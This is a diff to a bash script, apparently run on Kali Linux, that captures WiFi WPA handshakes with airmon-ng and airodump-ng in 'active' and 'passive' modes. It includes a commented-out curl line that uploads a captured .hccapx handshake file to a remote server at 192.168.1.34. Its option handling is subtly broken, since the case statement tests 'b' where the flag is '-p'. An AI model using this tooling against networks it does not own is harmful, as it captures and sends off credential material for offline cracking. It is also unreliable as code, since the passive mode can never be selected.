@@ -35,7 +35,7 @@ checkHandshakes(){
         rm /home/kali/shakes-*
 }
 
-main(){
+active(){
 	trap "rm /home/kali/sha*" EXIT
 	airmon-ng check kill
 	airmon-ng start wlan1
@@ -68,4 +68,32 @@ main(){
 	done < /home/kali/shakes-01.csv
 
 }
-main
+
+passive(){
+	trap 'checkHandshakes' EXIT
+
+        airmon-ng check kill
+        airmon-ng start wlan1
+
+        echo "Start airodump.."
+        airodump-ng -w /home/kali/shakes wlan1 < /dev/null > /dev/null
+
+
+        #curl -i -X POST -H "imei: asdfa" -H "date: 112321312" -H "Content-Type: multipart/form-data" -F "myFile=@/home/kali/cat.hccapx" http://192.168.1.34:9000/upload
+}
+
+if [ $# -lt 1 ]
+then
+	echo "Please use -a or -p flag"
+	exit 1
+fi
+
+while getopts "pa" opt
+do
+	case $opt in
+		a)active;;
+		b)passive;;
+		*)echo "Unknown option"
+	esac
+done
+
